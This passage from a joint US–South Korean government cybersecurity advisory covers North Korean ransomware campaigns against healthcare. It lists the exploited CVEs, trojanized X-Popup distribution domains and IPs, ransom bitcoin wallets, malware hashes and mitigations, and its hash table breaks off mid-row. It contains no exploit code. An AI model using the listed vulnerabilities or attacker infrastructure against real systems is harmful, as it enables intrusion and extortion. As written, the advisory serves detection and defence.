<li><strong>Purchase VPNs and VPSs [<a href="https://attack.mitre.org/techniques/T1583/003/" title="Acquire Infrastructure: Virtual Private Server">T1583.003</a>]</strong>. DPRK cyber actors will also use virtual private networks (VPNs) and virtual private servers (VPSs) or third-country IP addresses to appear to be from innocuous locations instead of from DPRK.</li>
<li><strong>Gain Access [<a href="https://attack.mitre.org/tactics/TA0001/" title="Initial Access">TA0001</a>]</strong>. Actors use various exploits of common vulnerabilities and exposures (CVE) to gain access and escalate privileges on networks. Recently observed CVEs that actors used to gain access include remote code execution in the Apache Log4j software library (known as Log4Shell) and remote code execution in unpatched SonicWall SMA 100 appliances [T1190 and T1133]. Observed CVEs used include:</li>
<li>CVE 2021-44228</li>
<li>CVE-2021-20038</li>
<li>CVE-2022-24990</li>
</ul><p>Actors also likely spread malicious code through Trojanized files for “X-Popup,” an open source messenger commonly used by employees of small and medium hospitals in South Korea [<a href="https://attack.mitre.org/techniques/T1195" title="Supply Chain Compromise">T1195</a>].</p>
<p>The actors spread malware by leveraging two domains: <code>xpopup.pe[.]kr</code> and <code>xpopup.com</code>. <code>xpopup.pe[.]kr</code> is registered to IP address <code>115.68.95[.]128</code> and <code>xpopup[.]com</code> is registered to IP address <code>119.205.197[.]111</code>. Related file names and hashes are listed in table 1.</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><caption><em>Table 1: Malicious file names and hashes spread by xpopup domains</em></caption>
<thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">File Name</th>
<th scope="col" role="columnheader">MD5 Hash</th>
</tr></thead><tbody><tr><td>xpopup.rar</td>
<td>1f239db751ce9a374eb9f908c74a31c9</td>
</tr><tr><td>X-PopUp.exe</td>
<td>6fb13b1b4b42bac05a2ba629f04e3d03</td>
</tr><tr><td>X-PopUp.exe</td>
<td>cf8ba073db7f4023af2b13dd75565f3d</td>
</tr><tr><td>xpopup.exe</td>
<td>4e71d52fc39f89204a734b19db1330d3</td>
</tr><tr><td>x-PopUp.exe</td>
<td>43d4994635f72852f719abb604c4a8a1</td>
</tr><tr><td>xpopup.exe</td>
<td>5ae71e8440bf33b46554ce7a7f3de666</td>
</tr></tbody></table><ul><li><strong>Move Laterally and Discovery [<a href="https://attack.mitre.org/tactics/TA0007/" title="Discovery">TA0007</a>, <a href="https://attack.mitre.org/tactics/TA0008/" title="Lateral Movement">TA0008</a>]</strong>. After initial access, DPRK cyber actors use staged payloads with customized malware to perform reconnaissance activities, upload and download additional files and executables, and execute shell commands [<a href="https://attack.mitre.org/techniques/T1083" title="File and Directory Discovery">T1083</a>, <a href="https://attack.mitre.org/techniques/T1021" title="Remote Services">T1021</a>]. The staged malware is also responsible for collecting victim information and sending it to the remote host controlled by the actors [<a href="https://attack.mitre.org/tactics/TA0010" title="Exfiltration">TA0010</a>].</li>
<li><strong>Employ Various Ransomware Tools [<a href="https://attack.mitre.org/tactics/TA0040/" title="Impact">TA0040</a>]</strong>. Actors have used privately developed ransomware, such as Maui and H0lyGh0st [<a href="https://attack.mitre.org/techniques/T1486" title="Data Encrypted for Impact">T1486</a>]. Actors have also been observed using or possessing publically available tools for encryption, such as BitLocker, Deadbolt, ech0raix, GonnaCry, Hidden Tear, Jigsaw, LockBit 2.0, My Little Ransomware, NxRansomware, Ryuk, and YourRansom [<a href="https://attack.mitre.org/techniques/T1486/" title="Data Encrypted for Impact">T1486</a>]. In some cases, DPRK actors have portrayed themselves as other ransomware groups, such as the REvil ransomware group. For IOCs associated with Maui and H0lyGh0st ransomware usage, please see Appendix B.</li>
<li><strong>Demand Ransom in Cryptocurrency</strong>. DPRK cyber actors have been observed setting ransoms in bitcoin [<a href="https://attack.mitre.org/techniques/T1486/" title="Data Encrypted for Impact">T1486</a>].</li>
<li>Actors are known to communicate with victims via Proton Mail email accounts. For private companies in the healthcare sector, actors may threaten to expose a company’s proprietary data to competitors if ransoms are not paid. Bitcoin wallet addresses possibly used by DPRK cyber actors include:
<ul><li>1MTHBCrBKYEthfa16zo9kabt4f9jMJz8Rm</li>
<li>bc1q80vc4yjgg6umedkut3e9mhehxl4q4dcjjyzh59</li>
<li>1J8spy62o7z2AjQxoUpiCGnBh5cRWKVWJC</li>
<li>16ENLdHbnmDcEV8iqN4vuyZHa7sSdYRh76</li>
<li>bc1q3wzxvu8yhs8h7mlkmf7277wyklkah9k4sm9anu</li>
<li>bc1q8xyt4jxhw7mgqpwd6qfdjyxgvjeuz57jxrvgk9</li>
<li>1NqihEqYaQaWiZkPVdSMiTbt7dTy1LMxgX</li>
<li>bc1qxrpevck3pq1yzrx2pq2rkvkvy0jnm56nzjv6pw</li>
<li>14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk</li>
<li>1KCwfCUgnSy3pzNX7U1i5NwFzRtth4bRBc</li>
<li>16sYqXancDDiijcuruZecCkdBDwDf4vSEC</li>
<li>1N6JphHFaYmYaokS5xH31Z67bvk4ykd9CP</li>
<li>LZ1VNJfn6mWjPzkCyoBvqWaBZYXAwn135</li>
<li>1KmWW6LgdgykBBrSXrFu9kdoHz95Fe9kQF</li>
<li>1FX4W9rrG4F3Uc7gJ18GCwGab8XuW8Ajy2</li>
<li>bc1qlqgu2l2kms5338zuc95kxavctzyy0v705tpvyc</li>
<li>bc1qy6su7vrh7ts5ng2628escmhr98msmzg62ez2sp</li>
<li>bc1q8t69gpxsezdcr8w6tfzp3jeptq4tcp2g9d0mwy</li>
<li>bc1q9h7yj79sqm4t536q0fdn7n4y2atsvvl22m28ep</li>
<li>bc1qj6y72rk039mqpgtcy7mwjd3eum6cx6027ndgmd</li>
<li>bc1qcp557vltuu3qc6pk3ld0ayagrxuf2thp3pjzpe</li>
<li>bc1ql8wsflrjf9zlusauynzjm83mupq6c9jz9vnqxg</li>
<li>bc1qx60ec3nfd5yhsyyxkzkpts54w970yxj84zrdck</li>
<li>bc1qunqnjdlvqkjuhtclfp8kzkjpvdz9qnk898xczp</li>
<li>bc1q6024d73h48fnhwswhwt3hqz2lzw6x99q0nulm4</li>
<li>bc1qwdvexlyvg3mqvqw7g6l09qup0qew80wjj9jh7x</li>
<li>bc1qavrtge4p7dmcrnvhlvuhaarx8rek76wxyk7dgg</li>
<li>bc1qagaayd57vr25dlqgk7f00nhz9qepqgnlnt4upu</li>
<li>bc1quvnaxnpqlzq3mdhfddh35j7e7ufxh3gpc56hca</li>
<li>bc1qu0pvfmtxawm8s99lcjvxapungtsmkvwyvak6cs</li>
<li>bc1qg3zlxxhhcvt6hkuhmqml8y9pas76cajcu9ltdl</li>
<li>bc1qn7a3g23nzpuytchyyteyhkcse84cnylznl3j32</li>
<li>bc1qhfmqstxp3yp9muvuz29wk77vjtdyrkff4nrxpu</li>
<li>bc1qnh8scrvuqvlzmzgw7eesyrmtes9c5m78duetf3</li>
<li>bc1q7qry3lsrphmnw3exs7tkwzpvzjcxs942aq8n0y</li>
<li>bc1qcmlcxfsy0zlqhh72jvvc4rh7hvwhx6scp27na0</li>
<li>bc1q498fn0gauj2kkjsg35mlwk2cnxhaqlj7hkh8xy</li>
<li>bc1qnz4udqkumjghnm2a3zt0w3ep8fwdcyv3krr3jq</li>
<li>bc1qk0saaw7p0wrwla6u7tfjlxrutlgrwnudzx9tyw</li>
<li>bc1qyue2pgjk09ps7qvfs559k8kee3jkcw4p4vdp57</li>
<li>bc1q6qfkt06xmrpclht3acmq00p7zyy0ejydu89zwv</li>
<li>bc1qmge6a7sp659exnx78zhm9zgrw88n6un0rl9trs</li>
<li>bc1qcywkd7zqlwmjy36c46dpf8cq6ts6wgkjx0u7cn</li>
</ul></li>
</ul><h4><strong>MITIGATIONS</strong></h4>
<p><strong>Note:</strong> These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the U.S. National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. For more information on the CPGs, including additional recommended baseline protections, see <a href="https://www.cisa.gov/cpg">cisa.gov/cpg</a>.</p>
<p>The authoring agencies urge HPH organizations to:</p>
<ul><li>Limit access to data by authenticating and encrypting connections (e.g., using public key infrastructure certificates in virtual private network (VPN) and transport layer security (TLS) connections) with network services, Internet of Things (IoT) medical devices, and the electronic health record system [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 3.3</a>].</li>
<li>Implement the principle of least privilege by using standard user accounts on internal systems instead of administrative accounts [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 1.5</a>], which grant excessive system administration privileges.</li>
<li>Turn off weak or unnecessary network device management interfaces, such as Telnet, SSH, Winbox, and HTTP for wide area networks (WANs) and secure with strong passwords and encryption when enabled.</li>
<li>Protect stored data by masking the permanent account number (PAN) when displayed and rendering it unreadable when stored—through cryptography, for example.</li>
<li>Secure the collection, storage, and processing practices for personally identifiable information (PII)/protected health information (PHI), per regulations such as the Health Insurance Portability and Accountability Act of 1996 (HIPAA). Implementing HIPAA security measures could prevent the introduction of malware to the system [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 3.4</a>].
<ul><li>Secure PII/ PHI at collection points and encrypt the data at rest and in transit using technologies, such as TLS. Only store personal patient data on internal systems that are protected by firewalls, and ensure extensive backups are available.</li>
<li>Create and regularly review internal policies that regulate the collection, storage, access, and monitoring of PII/PHI.</li>
</ul></li>
<li>Implement and enforce multi-layer network segmentation with the most critical communications and data resting on the most secure and reliable layer [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 8.1</a>].</li>
<li>Use monitoring tools to observe whether IoT devices are behaving erratically due to a compromise [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 3.1</a>].</li>
</ul><p>In addition, the authoring agencies urge all organizations, including HPH Sector organizations, to apply the following recommendations to prepare for and mitigate ransomware incidents:</p>
<ul><li><strong>Maintain isolated backups of data, and regularly test backup and restoration </strong>[<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 7.3</a>]. These practices safeguard an organization’s continuity of operations or at least minimize potential downtime from a ransomware incident and protect against data losses.
<ul><li>Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.</li>
</ul></li>
<li><strong>Create, maintain, and exercise a basic cyber incident response plan and associated communications plan</strong> that includes response procedures for a ransomware incident [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 7.1, 7.2</a>].
<ul><li>Organizations should also ensure their incident response and communications plans include data breach incidents response and notification procedures. Ensure the notification procedures adhere to applicable laws.</li>
<li>See the <a href="https://www.cisa.gov/stopransomware/ransomware-guide">CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide</a> and CISA Fact Sheet <a href="https://cisa.gov/sites/default/files/publications/CISA_Fact_Sheet-Protecting_Sensitive_and_Personal_Information_from_Ransomware-Caused_Data_Breaches-508C.pdf">Protecting Sensitive and Personal Information from Ransomware-Caused Data Breaches</a> for information on creating a ransomware response checklist and planning and responding to ransomware-caused data breaches.</li>
</ul></li>
<li><strong>Install updates for operating systems, software, and firmware as soon as they are released</strong> [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 5.1</a>]. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Regularly check for software updates and end-of-life notifications and prioritize patching <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">known exploited vulnerabilities</a>. Consider leveraging a centralized patch management system to automate and expedite the process.</li>
<li><strong>If you use Remote Desktop Protocol (RDP), or other potentially risky services, secure and monitor them closely</strong> [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 5.4</a>].
<ul><li>Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure. After assessing risks, if RDP is deemed operationally necessary, restrict the originating sources, and require <a href="https://www.cisa.gov/mfa">phishing-resistant multifactor authentication (MFA)</a> to mitigate credential theft and reuse [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 1.3</a>]. If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices. Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 1.1, 3.1</a>].</li>
<li>Ensure devices are properly configured and that security features are enabled. Disable ports and protocols not in use for a business purpose (e.g., RDP Transmission Control Protocol port 3389).</li>
<li>Restrict the Server Message Block (SMB) protocol within the network to only access necessary servers and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.</li>
<li>Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 5.6, 6.2</a>].</li>
<li>Implement application control policies that only allow systems to execute known and permitted programs [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 2.1</a>].</li>
<li>Open document readers in protected viewing modes to help prevent active content from running.</li>
</ul></li>
<li><strong>Implement a user training program and phishing exercises</strong> [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 4.3</a>] to raise awareness among users about the risks of visiting websites, clicking on links, and opening attachments. Reinforce the appropriate user response to phishing and spearphishing emails.</li>
<li><strong><a href="https://cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf">Require phishing-resistant MFA</a> for as many services as possible</strong> [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 1.3</a>]—particularly for webmail, VPNs, accounts that access critical systems, and privileged accounts that manage backups.</li>
<li><strong>Use strong passwords</strong> [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 1.4</a>] and avoid reusing passwords for multiple accounts. See CISA Tip <a href="https://www.cisa.gov/uscert/ncas/tips/ST04-002">Choosing and Protecting Passwords</a> and National Institute of Standards and Technology (NIST) <a href="https://pages.nist.gov/800-63-3/sp800-63.html">Special Publication 800-63B: Digital Identity Guidelines</a> for more information.</li>
<li><strong>Require administrator credentials to install software</strong> [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 1.5</a>].</li>
<li><strong>Audit user accounts with administrative or elevated privileges</strong> [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 1.5</a>] and configure access controls with least privilege in mind.</li>
<li><strong>Install and regularly update antivirus and antimalware software on all hosts.</strong></li>
<li><strong>Only use secure networks.</strong> Consider installing and using a VPN.</li>
<li><strong>Consider adding an email banner to messages coming from outside your organizations</strong> [<a href="https://cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf">CPG 8.3</a>] indicating that they are higher risk messages.</li>
<li><strong>Consider participating in CISA’s no-cost <a href="https://www.cisa.gov/ais">Automated Indicator Sharing (AIS)</a></strong> program to receive real-time exchange of machine-readable cyber threat indicators and defensive measures.</li>
</ul><p>If a ransomware incident occurs at your organization:</p>
<ul><li>Follow your organization’s ransomware response checklist.</li>
<li>Scan backups. If possible, scan backup data with an antivirus program to check that it is free of malware. This should be performed using an isolated, trusted system to avoid exposing backups to potential compromise.</li>
<li><strong>U.S. organizations:</strong> Follow the notification requirements as outlined in your cyber incident response plan. Report incidents to appropriate authorities; in the U.S., this would include the FBI at a <a href="https://www.fbi.gov/contact-us/field-offices">local FBI Field Office</a>, CISA at <a href="https://www.cisa.gov/report">cisa.gov/report</a>, or the U.S. Secret Service (USSS) at a <a href="https://www.secretservice.gov/contact/field-offices">USSS Field Office</a>.</li>
<li><strong>South Korean organizations:</strong> Please report incidents to NIS, KISA (Korea Internet & Security Agency), and KNPA (Korean National Police Agency).
<ul><li>NIS (National Intelligence Service)
<ul><li>Telephone : 111</li>
<li><a href="https://www.nis.go.kr/">https://www.nis.go.kr</a></li>
</ul></li>
<li>KISA (Korea Internet & Security Agency)
<ul><li>Telephone : 118 (Consult Service)</li>
<li><a href="https://www.boho.or.kr/consult/ransomware.do">https://www.boho.or.kr/consult/ransomware.do</a></li>
</ul></li>
<li>KNPA (Korean National Police Agency)
<ul><li>Electronic Cybercrime Report & Management System: <a href="https://ecrm.police.go.kr/minwon/main">https://ecrm.police.go.kr/minwon/main</a></li>
</ul></li>
</ul></li>
<li>Apply incident response best practices found in the joint Cybersecurity Advisory, <a href="https://www.cisa.gov/uscert/ncas/alerts/aa20-245a">Technical Approaches to Uncovering and Remediating Malicious Activity</a>, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.</li>
</ul><h4><strong>RESOURCES</strong></h4>
<p>Stairwell provided a YARA rule to identify Maui ransomware, and a Proof of Concept public RSA key extractor at the following link:<br /><a href="https://www.stairwell.com/news/threat-research-report-maui-ransomware/">https://www.stairwell.com/news/threat-research-report-maui-ransomware/</a></p>
<h4><strong>REQUEST FOR INFORMATION</strong></h4>
<p>The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, bitcoin wallet information, the decryptor file, and/or benign samples of encrypted files. As stated above, the authoring agencies discourage paying ransoms. Payment does not guarantee files will be recovered and may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. However, the agencies understand that when victims are faced with an inability to function, all options are evaluated to protect shareholders, employees, and customers.</p>
<p>Regardless of whether you or your organization decide to pay a ransom, the authoring agencies urge you to promptly report ransomware incidents using the contact information above.</p>
<h4><strong>ACKNOWLEDGEMENTS</strong></h4>
<p>NSA, FBI, CISA, and HHS would like to thank ROK NIS and DSA for their contributions to this CSA.</p>
<h6><strong><em>Disclaimer of endorsement</em></strong></h6>
<p>The information and opinions contained in this document are provided "as is" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.</p>
<h6><strong><em>Trademark recognition</em></strong></h6>
<p>Microsoft Threat Intelligence Center is a registered trademark of Microsoft Corporation. Apache®, Sonicwall, and Apache Log4j are trademarks of Apache Software Foundation. TerraMaster Operating System is a registered trademark of Octagon Systems.</p>
<h6><strong><em>Purpose</em></strong></h6>
<p>This document was developed in furtherance of the authors’ cybersecurity missions, including their responsibilities to identify and disseminate threats, and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.</p>
<h5>Appendix A: CVE Details</h5>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">CVE-2021-44228     CVSS 3.0: 10 (Critical)</th>
</tr></thead><tbody><tr><td><u><strong>Vulnerability Description</strong></u><br />
			Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. From version 2.16.0 (along with 2.12.2, 2.12.3, and 2.3.1), this functionality has been completely removed. Note that this vulnerability is specific to log4j-core and does not affect log4net, log4cxx, or other Apache Logging Services projects.</td>
</tr><tr><td><strong><u>Recommended Mitigations</u></strong><br />
			Apply patches provided by vendor and perform required system updates.</td>
</tr><tr><td><u><strong>Detection Methods</strong></u><br />
			See vendors’ <a href="https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/">Guidance For Preventing, Detecting, and Hunting for Exploitation of the Log4j 2 Vulnerability</a>.</td>
</tr><tr><td><u><strong>Vulnerable Technologies and Versions</strong></u><br />
			There are numerous vulnerable technologies and versions associated with CVE-2021-44228. For a full list, please check <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">https://nvd.nist.gov/vuln/detail/CVE-2021-44228</a>.</td>
</tr><tr><td>See <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228">https://nvd.nist.gov/vuln/detail/CVE-2021-44228</a> for more information.</td>
</tr></tbody></table><table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">CVE-2021-20038     CVSS 3.0: 9.8 (Critical)</th>
</tr></thead><tbody><tr><td><strong><u>Vulnerability Description</u></strong><br />
			A Stack-based buffer overflow vulnerability in SMA100 Apache httpd server's mod_cgi module environment variables allows a remote unauthenticated attacker to potentially execute code as a 'nobody' user in the appliance. This vulnerability affected SMA 200, 210, 400, 410 and 500v appliances firmware 10.2.0.8-37sv, 10.2.1.1-19sv, 10.2.1.2-24sv and earlier versions.</td>
</tr><tr><td><u><strong>Recommended Mitigations</strong></u><br />
			Apply all appropriate vendor updates<br />
			Upgrade to:
<ul><li>SMA 100 Series - (SMA 200, 210, 400, 410, 500v (ESX, Hyper-V, KVM, AWS, Azure):</li>
<li>SonicWall SMA100 build versions 10.2.0.9-41sv or later</li>
<li>SonicWall SMA100 build versions 10.2.1.3-27sv or later</li>
</ul><p>System administrators should refer to the SonicWall Security Advisories in the reference section to determine affected applications/systems and appropriate fix actions.</p>
<p>Support for 9.0.0 firmware ended on 10/31/2021. Customers still using that firmware are requested to upgrade to the latest 10.2.x versions.</p>
</td>
</tr><tr><td><u><strong>Vulnerable Technologies and Versions</strong></u><br />
			Sonicwall Sma 200 Firmware 10.2.0.8-37Sv<br />
			Sonicwall Sma 200 Firmware 10.2.1.1-19Sv<br />
			Sonicwall Sma 200 Firmware 10.2.1.2-24Sv<br />
			Sonicwall Sma 210 Firmware 10.2.0.8-37Sv<br />
			Sonicwall Sma 210 Firmware 10.2.1.1-19Sv<br />
			Sonicwall Sma 210 Firmware 10.2.1.2-24Sv<br />
			Sonicwall Sma 410 Firmware 10.2.0.8-37Sv<br />
			Sonicwall Sma 410 Firmware 10.2.1.1-19Sv<br />
			Sonicwall Sma 410 Firmware 10.2.1.2-24Sv<br />
			Sonicwall Sma 400 Firmware 10.2.0.8-37Sv<br />
			Sonicwall Sma 400 Firmware 10.2.1.1-19Sv<br />
			Sonicwall Sma 400 Firmware 10.2.1.2-24Sv<br />
			Sonicwall Sma 500V Firmware 10.2.0.8-37Sv<br />
			Sonicwall Sma 500V Firmware 10.2.1.1-19Sv<br />
			Sonicwall Sma 500V Firmware 10.2.1.2-24Sv</td>
</tr><tr><td>See <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-20038">https://nvd.nist.gov/vuln/detail/CVE-2021-20038</a> for more information.</td>
</tr></tbody></table><table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">CVE-2022-24990    CVSS 3.x: N/A</th>
</tr></thead><tbody><tr><td><strong><u>Vulnerability Description</u></strong><br />
			The TerraMaster OS Unauthenticated Remote Command Execution via PHP Object Instantiation Vulnerability is characterized by scanning activity targeting a flaw in the script enabling a remote adversary to execute commands on the target endpoint. The vulnerability is created by improper input validation of the webNasIPS component in the api.php script and resides on the TNAS device appliances' operating system where users manage storage, backup data, and configure applications. By exploiting the script flaw a remote unauthenticated attacker can pass specially crafted data to the application and execute arbitrary commands on the target system. This may result in complete compromise of the target system, including the exfiltration of information. TNAS devices can be chained to acquire unauthenticated remote code execution with highest privileges.</td>
</tr><tr><td><strong><u>Recommended Mitigations</u></strong><br />
			Install relevant vendor patches. This vulnerability was patched in TOS version 4.2.30</td>
</tr><tr><td><strong><u>Vulnerable Technologies and Versions</u></strong><br />
			TOS v 4.2.29</td>
</tr><tr><td>See <a href="https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/">https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/</a> and <a href="https://forum.terra-master.com/en/viewtopic.php?t=3030">https://forum.terra-master.com/en/viewtopic.php?t=3030</a> for more information.</td>
</tr></tbody></table><h5>Appendix B: Indicators of Compromise (IOCs)</h5>
<p>The IOC section includes hashes and IP addresses for the Maui and H0lyGh0st ransomware variants—as well as custom malware implants assumedly developed by DPRK cyber actors, such as remote access trojans (RATs), loaders, and other tools—that enable subsequent deployment of ransomware. For additional Maui IOCs, see joint CSA <a href="https://www.cisa.gov/uscert/ncas/alerts/aa22-187a">North Korean State-Sponsored Cyber Actors Use Maui Ransomware to Target the Healthcare and Public Health Sector</a>.</p>
<p>Table 2 lists MD5 and SHA256 hashes associated with malware implants, RATs, and other tools used by DPRK cyber actors, including tools that drop Maui ransomware files.</p>
<table class="tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><caption><em>Table 2: File names and hashes of malicious implants, RATs, and tools</em></caption>
<thead><tr><th scope="col" role="columnheader" data-tablesaw-priority="persist">MD5Hash</th>
<th scope="col" role="columnheader">SHA256Hash</th>
</tr></thead><tbody><tr><td>079b4588eaa99a1e802adf5e0b26d8aa</td>
<td>f67ee77d6129bd1bcd5d856c0fc5314169b946d32b8abaa4e680bb98130b38e7</td>
</tr><tr><td>0e9e256d8173854a7bc26982b1dde783</td>
<td>--</td>
</tr><tr><td>12c15a477e1a96120c09a860c9d479b3</td>
<td>6263e421e397db821669420489d2d3084f408671524fd4e1e23165a16dda2225</td>
</tr><tr><td>131fc4375971af391b459de33f81c253</td>
<td>--</td>
</tr><tr><td>17c46ed7b80c2e4dbea6d0e88ea0827c</td>
<td>b9af4660da00c7fa975910d0a19fda072031c15fad1eef935a609842c51b7f7d</td>
</tr><tr><td>1875f6a68f70bee316c8a6eda9ebf8de</td>
<td>672ec8899b8ee513dbfc4590440a61023846ddc2ca94c88ae637144305c497e7</td>
</tr><tr><td>1a74c8d8b74ca2411c1d3d22373a6769</td>
<td>ba8f9e7afe5f78494c111971c39a89111ef9262bf23e8a764c6f65c818837a44</td>
</tr><tr><td>1f6d9f8fbdbbd4e6ed8cd73b9e95a928</td>
<td>4f089afa51fd0c1b2a39cc11cedb3a4a326111837a5408379384be6fe846e016</td>
</tr><tr><td>2d02f5499d35a8dffb4c8bc0b7fec5c2</td>
<td>830207029d83fd46a4a89cd623103ba2321b866428aa04360376e6a390063570</td>
</tr><tr><td>2e18350194e59bc6a2a3f6d59da11bd8</td>
<td>655aa64860f1655081489cf85b77f72a49de846a99dd122093db4018434b83ae</td>
</tr><tr><td>3bd22e0ac965ebb6a18bb71ba39e96dc</td>
<td>6b7f566889b80d1dba4f92d5e2fb2f5ef24f57fcfd56bb594978dffe9edbb9eb</td>
</tr><tr><td>40f21743f9cb927b2c84ecdb7dfb14a6</td>
<td>5081f54761947bc9ce4aa2a259a0bd60b4ec03d32605f8e3635c4d4edaf48894</td>
</tr><tr><td>4118d9adce7350c3eedeb056a3335346</td>
<td>5b7ecf7e9d0715f1122baf4ce745c5fcd769dee48150616753fec4d6da16e99e</td>
</tr><tr><td>43e756d80225bdf1200bc34eef5adca8</td>
<td>afb2d4d88f59e528f0e388705113ae54b7b97db4f03a35ae43cc386a48f263a0</td>
</tr><tr><td>47791bf9e017e3001ddc68a7351ca2d6</td>
<td>863b707873f7d653911e46885e261380b410bb3bf6b158daefb47562e93cb657</td>
</tr><tr><td>505262547f8879249794fc31eea41fc6</td>
<td>f32f6b229913d68daad937cc72a57aa45291a9d623109ed48938815aa7b6005c</td>
</tr><tr><td>5130888a0ad3d64ad33c65de696d3fa2</td>
<td>c92c1f3e77a1876086ce530e87aa9c1f9cbc5e93c5e755b29cad10a2f3991435</td>
</tr><tr><td>58ad3103295afcc22bde8d81e77c282f</td>
<td>18b75949e03f8dcad513426f1f9f3ca209d779c24cd4e941d935633b1bec00cb</td>
</tr><tr><td>5be1e382cd9730fbe386b69bd8045ee7</td>
<td>5ad106e333de056eac78403b033b89c58b4c4bdda12e2f774625d47ccfd3d3ae</td>
</tr><tr><td>5c6f9c83426c6d33ff2d4e72c039b747</td>
<td>a3b7e88d998078cfd8cdf37fa5454c45f6cbd65f4595fb94b2e9c85fe767ad47</td>
</tr><tr><td>640e70b0230dc026eff922fb1e44c2ea</td>
<td>6319102bac226dfc117c3c9e620cd99c7eafbf3874832f2ce085850aa042f19c</td>
</tr><tr><td>67f4dad1a94ed8a47283c2c0c05a7594</td>
<td>3fe624c33790b409421f4fa2bb8abfd701df2231a959493c33187ed34bec0ae7</td>
</tr><tr><td>70652edadedbacfd30d33a826853467d</td>
<td>196fb1b6eff4e7a049cea323459cfd6c0e3900d8d69e1d80bffbaabd24c06eba</td>
</tr><tr><td>739812e2ae1327a94e441719b885bd19</td>
<td>6122c94cbfa11311bea7129ecd5aea6fae6c51d23228f7378b5f6b2398728f67</td>
</tr><tr><td>76c3d2092737d964dfd627f1ced0af80</td>
<td>bffe910904efd1f69544daa9b72f2a70fb29f73c51070bde4ea563de862ce4b1</td>
</tr><tr><td>802e7d6e80d7a60e17f9ffbd62fcbbeb</td>
